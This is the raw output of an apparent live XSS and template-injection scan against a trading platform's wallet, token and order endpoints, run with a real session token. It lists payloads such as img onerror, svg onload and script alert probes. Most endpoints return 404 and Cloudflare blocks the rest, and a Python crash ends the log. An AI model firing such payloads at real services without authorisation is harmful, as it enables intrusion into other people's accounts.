@@ -1,0 +1,107 @@
+================================================================================
+🦊 LIVE XSS HUNT - TESTING WITH YOUR REAL SESSION
+================================================================================
+Session: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnb...
+Cookies: 9 loaded
+================================================================================
+
+================================================================================
+PHASE 1: ACCOUNT/WALLET VECTORS
+================================================================================
+
+[Wallet Add]
+   Endpoint: POST /account/wallet/add
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[Wallet Update]
+   Endpoint: POST /account/wallet/update
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[User Profile Update]
+   Endpoint: POST /account/user/update
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+================================================================================
+PHASE 2: TOKEN/ASSET VECTORS
+================================================================================
+
+[Token Note Create]
+   Endpoint: POST /api/v1/token/note/create
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[Token Comment]
+   Endpoint: POST /xapi/v1/token/comment
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[Watchlist Create]
+   Endpoint: POST /xapi/v1/watchlist/create
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[Portfolio Create]
+   Endpoint: POST /api/v1/portfolio/create
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+================================================================================
+PHASE 3: SEARCH/FILTER VECTORS (Reflected)
+================================================================================
+
+[Search Query]
+   Endpoint: GET /api/v1/search
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+[Token Search]
+   Endpoint: GET /xapi/v1/token/search
+
+   [Template] Testing: {{7*7}}
+   Status: 404 | ❌ Not found
+
+================================================================================
+PHASE 4: TRADING/ORDER VECTORS (May require auth)
+================================================================================
+
+[Limit Order Label]
+   Endpoint: POST /tapi/v1/trading_bot/limit_order/create
+
+   [Template] Testing: {{7*7}}
+   Status: 400 | ❌ Error
+
+   [HTML Comment] Testing: <!--XSS-->
+   Status: 403 | ❌ Cloudflare WAF blocked
+
+   [IMG] Testing: <img src=x onerror=alert(1)>
+   Status: 403 | ❌ Cloudflare WAF blocked
+
+   [SVG] Testing: <svg onload=alert(1)>
+   Status: 403 | ❌ Cloudflare WAF blocked
+
+   [Script] Testing: <script>alert(1)</script>
+   Status: 403 | ❌ Cloudflare WAF blocked
+Traceback (most recent call last):
+  File "/projects/sandbox/gmg/live_xss_hunt.py", line 237, in <module>
+    test_endpoint(
+  File "/projects/sandbox/gmg/live_xss_hunt.py", line 81, in test_endpoint
+    test_body = json.loads(json.dumps(body).replace("PAYLOAD", payload))
+  File "/usr/lib64/python3.9/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+  File "/usr/lib64/python3.9/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "/usr/lib64/python3.9/json/decoder.py", line 353, in raw_decode
+    obj, end = self.scan_once(s, idx)
+json.decoder.JSONDecodeError: Expecting ',' delimiter: line 1 column 93 (char 92)
+/usr/bin/python3: can't open file '/projects/sandbox/gmg/xss_idor_hybrid.py': [Errno 2] No such file or directory
